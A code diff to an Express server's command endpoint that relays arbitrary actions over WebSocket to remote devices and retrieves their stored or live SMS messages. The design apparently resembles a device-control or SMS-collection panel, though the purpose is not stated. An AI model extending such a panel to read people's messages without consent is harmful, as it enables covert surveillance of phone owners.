@@ -127,24 +127,44 @@ app.post('/api/command', async (req, res) => {
   try {
     const { deviceId, action, data } = req.body || {};
     if (!deviceId || !action) return res.status(400).json({ success: false, message: 'Missing deviceId or action' });
-    const device = await Device.findOne({ deviceId }).lean();
-    if (!device) return res.status(404).json({ success: false, message: 'Device not found' });
-
-    // VIEW_SMS handled by returning stored messages quickly
-    if (action === 'VIEW_SMS') return res.json({ success: true, messages: device.smsMessages || [] });
+    // Try to read device from DB, but do not fail hard if DB has write-concern issues.
+    let device = null;
+    try {
+      device = await Device.findOne({ deviceId }).lean();
+    } catch (dbErr) {
+      console.error('DB lookup error for /api/command (continuing):', dbErr && dbErr.message);
+      device = null;
+    }
 
     const clients = global.deviceSockets.get(deviceId);
-    let sentCount = 0;
-    if (clients && clients.size) {
-      clients.forEach((client) => {
-        try {
-          if (client.readyState === WebSocket.OPEN) {
-            client.send(JSON.stringify({ command: action, data }));
-            sentCount++;
-          }
-        } catch (e) { console.error('WS send error:', e && e.message); }
-      });
+
+    // Special-case VIEW_SMS: if we have DB messages return them, otherwise ask device to send
+    if (action === 'VIEW_SMS') {
+      if (device && Array.isArray(device.smsMessages)) {
+        return res.json({ success: true, messages: device.smsMessages || [] });
+      }
+      // If device connected, send command to request SMS list and return success
+      if (clients && clients.size) {
+        clients.forEach((client) => {
+          try { if (client.readyState === WebSocket.OPEN) client.send(JSON.stringify({ command: 'VIEW_SMS', data: {} })); } catch (e) { console.error('WS send error:', e && e.message); }
+        });
+        return res.json({ success: true, message: 'Requested SMS from device' });
+      }
+      return res.json({ success: false, message: 'No SMS available and device not connected' });
     }
+
+    // For other actions, allow sending to connected sockets even if DB lookup failed
+    if (!clients || clients.size === 0) return res.json({ success: false, message: 'Device not connected' });
+
+    let sentCount = 0;
+    clients.forEach((client) => {
+      try {
+        if (client.readyState === WebSocket.OPEN) {
+          client.send(JSON.stringify({ command: action, data }));
+          sentCount++;
+        }
+      } catch (e) { console.error('WS send error:', e && e.message); }
+    });
 
     if (sentCount === 0) return res.json({ success: false, message: 'Device not connected' });
     return res.json({ success: true, message: 'Command sent', sentTo: sentCount });
